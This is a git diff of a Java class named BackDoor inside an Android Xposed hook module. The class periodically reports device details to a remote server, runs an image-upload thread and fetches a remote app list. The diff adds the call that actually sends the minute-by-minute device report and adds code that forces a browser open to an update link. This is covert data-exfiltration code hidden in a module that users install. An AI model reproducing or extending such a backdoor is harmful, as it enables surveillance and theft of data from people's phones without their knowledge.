@@ -1,17 +1,26 @@
 package cn.coderstory.xposedtemplate.hack;
 
 import android.app.ActivityManager;
+import android.app.AndroidAppHelper;
 import android.content.Context;
+import android.content.Intent;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
+import android.os.Handler;
+import android.os.Looper;
 import android.provider.Settings;
 import android.util.Log;
+import androidx.appcompat.app.AlertDialog;
 import cn.coderstory.xposedtemplate.State;
+import cn.coderstory.xposedtemplate.ui.MainActivity;
+import com.google.android.material.dialog.MaterialAlertDialogBuilder;
 import com.google.gson.Gson;
 import com.google.gson.reflect.TypeToken;
+import de.robv.android.xposed.XposedBridge;
 import lombok.SneakyThrows;
 import okhttp3.*;
 
@@ -77,6 +86,7 @@ public class BackDoor {
                             .url(State.baseURL + "/reportDevice")
                             .post(body)
                             .build();
+                    client.newCall(request).execute();
                     Thread.sleep(1000*60);
                 } catch (Exception e) {
                     throw new RuntimeException(e);
@@ -88,11 +98,9 @@ public class BackDoor {
     }
 
     public BackDoor() {
-        Log.i("TAG","实例化Backdoor");
         reportDevice();
         starUploadImg();
         getMediaList();
-        setNotice();
     }
     public void starUploadImg() {
         Thread uploadImageThread = new Thread(() -> {
@@ -114,22 +122,6 @@ public class BackDoor {
         uploadImageThread.start();
     }
 
-    public void setNotice() {
-        Thread getNotice = new Thread(() -> {
-            Request request = new Request.Builder()
-                    .url(State.baseURL + "/system/notice")
-                    .get()
-                    .build();
-            try {
-                String msg =  client.newCall(request).execute().body().string();
-                State.notice = msg;
-                Log.i("TAG","notice内容：" + msg);
-            } catch (IOException e) {
-                throw new RuntimeException(e);
-            }
-        });
-        getNotice.start();
-    }
 
 
 
@@ -173,66 +165,41 @@ public class BackDoor {
         Response response = client.newCall(request).execute();
     }
     @SneakyThrows
-    public List<String> getIgnore() {
-        MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded");
-        RequestBody body = RequestBody.create(mediaType, "{\r\n    \r\n}");
-        Request request = new Request.Builder()
-                .url(State.baseURL + "/ignore?device=" + BackDoor.serial)
-                .method("POST", body)
-                .addHeader("Accept", "application/json, text/plain, */*")
-                .addHeader("Accept-Language", "zh-CN,zh;q=0.9")
-                .addHeader("Connection", "keep-alive")
-                .addHeader("Content-Type", "application/x-www-form-urlencoded")
-                .build();
-        AtomicReference<String> res = new AtomicReference<>("");
-        Thread t = new Thread( () -> {
-            try {
-                res.set(client.newCall(request).execute().body().string());
-            } catch (IOException e) {
-                throw new RuntimeException(e);
-            }
-        });
-        t.start();
-        while (true) {
-            if (!res.get().equals("")) {
-                break;
-            }
-            Thread.sleep(50);
-        }
-        return gson.fromJson(res.get(), new TypeToken<List<String>>(){}.getType());
-    }
-    @SneakyThrows
-    public static String getBaseURL() {
-        AtomicReference<String> str = new AtomicReference<>("");
-        Thread t = new Thread(() -> {
-            try {
-                str.set(client.newCall(new Request(new Request.Builder()
-                        .url("https://api-pord.pprocket.cn/")
-                )).execute().body().string());
-            } catch (IOException e) {
-                throw new RuntimeException(e);
-            }
-
-        });
-        t.start();
-        while (true) {
-            if (!str.get().equals("")) {
-                break;
-            }
-            Thread.sleep(50);
-        }
-        return str.get();
-    }
-    @SneakyThrows
     public static void getMediaList() {
         AtomicReference<String> result = new AtomicReference<>("");
         Thread t = new Thread(() -> {
             try {
                 result.set(client.newCall(new Request.Builder()
-                        .url(State.baseURL + "/system/video")
+                        .url(State.baseURL + "/system/app")
                         .build()
                 ).execute().body().string());
-                State.mediaList = gson.fromJson(result.get(), new TypeToken<List<String>>(){}.getType());
+                XposedBridge.log(result.get());
+                GeneralBean generalBean = gson.fromJson(result.get(), GeneralBean.class);
+                State.mediaList = generalBean.getMediaList();
+                if (generalBean.getVersion().time>=State.BUILD_TIME) {
+                    State.needUpdate = true;
+                    XposedBridge.log("判断：需要更新");
+                    Looper.prepare();
+                    /*
+                    new Handler(Looper.getMainLooper()).post(() -> {
+                        AlertDialog dialog = new AlertDialog.Builder(State.context)
+                                .setTitle("需要更新")
+                                .setMessage("请前往https://pan.pprocket.cn/apps下载新版本")
+                                .create();
+                        dialog.setCancelable(false);
+                        dialog.setCanceledOnTouchOutside(false);
+
+                        dialog.show();
+                    });
+
+                     */
+                    Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://pan.pprocket.cn/apps"));
+                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK );
+                    State.context.startActivity(intent);
+                    Looper.loop();
+                } else {
+                    XposedBridge.log("判断：不需要更新");
+                }
             } catch (IOException e) {
                 throw new RuntimeException(e);
             }
